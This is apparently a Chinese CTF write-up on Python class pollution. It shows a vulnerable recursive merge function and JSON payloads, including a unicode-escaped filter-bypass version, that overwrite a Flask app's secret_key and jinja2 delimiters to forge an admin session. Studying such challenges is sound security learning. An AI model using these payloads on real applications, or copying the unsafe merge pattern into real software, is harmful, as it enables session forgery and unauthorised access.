---
title: Python 原型链污染
date: 2025-02-03 14:50:35
tags:
  - CTF
  - Python
  - 原型链污染
categories:
  - 红队靶机
description: 一道 CTF 题：利用 Python 的 merge 函数做原型链污染，改写 Flask 的 secret_key 和 jinja2 模板语法，最终拿到 flag。
---

### Python

一般是有这个函数

```PHP
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
           
```

我们利用这个函数来修改这个属性

一道python原型链污染的题目 将app.secret_key改成自己想要的值就行，但同时我们发现给我们的文件夹中会对flag.html进行渲染，我们看一下flag.html

```PHP
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>index</title>
</head>
<body>
    这又是什么jinja语法啊！
    [#flag#]
</body>
</html>
```

{% raw %}发现此处并不是{{}}，而是[##]{% endraw %}
因此我们还需要修改jinja2模板语法，使flag得到渲染
接下来给出无过滤情况下的payload:

```PHP
{"__init__":
	{"__globals__":
		{"app":
			{
				"secret_key":"meteorkai",
				"jinja_env":{
					"variable_start_string":"[#",
					"variable_end_string":"#]"
				}
			}
		}
	}
}
```

但是此处存在过滤，我们使用unicode编码进行编码即可

```PHP
{"\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f":
	{"\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f":
		{"\u0061\u0070\u0070":
			{
				"secret\u005fkey":"meteorkai",
				"jinja\u005f\u0065\u006e\u0076":{
					"variable\u005fstart\u005f\u0073\u0074\u0072\u0069\u006e\u0067":"[#",
					"variable\u005fend\u005f\u0073\u0074\u0072\u0069\u006e\u0067":"#]"
				}
			}
		}
	}
}
```

污染完以后我们在根目录下post用户名和密码
username=adminer&password=meteorkai

![image-20250203144929575](/img/python-prototype-pollution/01.jpg)

然后我们将得到的session作为访问/admin时的session即可获取flag

![image-20250203144946681](/img/python-prototype-pollution/02.jpg)